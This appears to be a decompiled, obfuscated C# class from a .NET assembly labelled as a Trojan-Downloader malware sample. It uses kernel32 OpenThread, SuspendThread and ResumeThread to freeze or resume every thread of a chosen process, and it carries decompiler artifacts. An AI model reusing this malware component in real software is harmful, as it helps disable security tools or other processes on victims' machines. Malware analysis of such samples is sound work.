// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Client, Version=1.0.0.0, Culture=neutral, PublicKeyToken=f0f23b7759753841
// MVID: 88398440-486F-46D0-BB45-521B8EE8871E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\Trojan-Downloader.MSIL.Agent.dpv-1fc722c8c40a50aaf248839f7da26ad37a11b67963cf37e94fefd262632ab6b2.exe

using \u0016\u0015;
using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace \u0016\u0015
{
  internal sealed class \u0015\u0015
  {
    [DllImport("Kernel32.dll", EntryPoint = "SuspendThread")]
    private static extern int \u0011\u0017([In] IntPtr obj0);

    public int \u0012\u0017([In] IntPtr obj0) => \u0015\u0015.\u0011\u0017(obj0);

    [DllImport("kernel32.dll", EntryPoint = "OpenThread")]
    private static extern IntPtr \u0013\u0017(
      [In] \u0015\u0015.\u0017\u0015 obj0,
      [In] bool obj1,
      [In] int obj2);

    public IntPtr \u0014\u0017([In] int obj0) => \u0015\u0015.\u0013\u0017(\u0015\u0015.\u0017\u0015.\u0002, false, obj0);

    [DllImport("kernel32.dll", EntryPoint = "ResumeThread")]
    private static extern int \u0015\u0017([In] IntPtr obj0);

    public int \u0016\u0017([In] IntPtr obj0) => \u0015\u0015.\u0015\u0017(obj0);

    public object \u0017\u0017([In] object obj0)
    {
      IEnumerator enumerator;
      try
      {
        enumerator = \u0082\u0005.\u007E\u009D\u0004((object) \u0002\u0004.\u007E\u0014\u000E((object) \u009F\u0004.\u0015\u000E(\u0015\u0006.\u009D(obj0))[0]));
        while (\u008B\u0002.\u007E\u009D\u0002((object) enumerator))
        {
          ProcessThread processThread = (ProcessThread) \u001D\u0004.\u007E\u009E\u0002((object) enumerator);
          this.\u0012\u0017(this.\u0014\u0017(\u0090\u0005.\u007E\u001D\u000E((object) processThread)));
        }
      }
      finally
      {
        if (enumerator is IDisposable)
          \u000F\u0005.\u007E\u009F\u0002((object) (enumerator as IDisposable));
      }
      object obj;
      return obj;
    }

    public object \u0018\u0017([In] object obj0)
    {
      IEnumerator enumerator;
      try
      {
        enumerator = \u0082\u0005.\u007E\u009D\u0004((object) \u0002\u0004.\u007E\u0014\u000E((object) \u009F\u0004.\u0015\u000E(\u0015\u0006.\u009D(obj0))[0]));
        while (\u008B\u0002.\u007E\u009D\u0002((object) enumerator))
        {
          ProcessThread processThread = (ProcessThread) \u001D\u0004.\u007E\u009E\u0002((object) enumerator);
          this.\u0016\u0017(this.\u0014\u0017(\u0090\u0005.\u007E\u001D\u000E((object) processThread)));
        }
      }
      finally
      {
        if (enumerator is IDisposable)
          \u000F\u0005.\u007E\u009F\u0002((object) (enumerator as IDisposable));
      }
      object obj;
      return obj;
    }

    [Flags]
    internal enum \u0017\u0015
    {
      \u0001 = 1,
      \u0002 = 2,
      \u0003 = 8,
      \u0004 = 16, // 0x00000010
      \u0005 = 32, // 0x00000020
      \u0006 = 64, // 0x00000040
      \u0007 = 128, // 0x00000080
      \u0008 = 256, // 0x00000100
      \u000E = 512, // 0x00000200
    }
  }
}
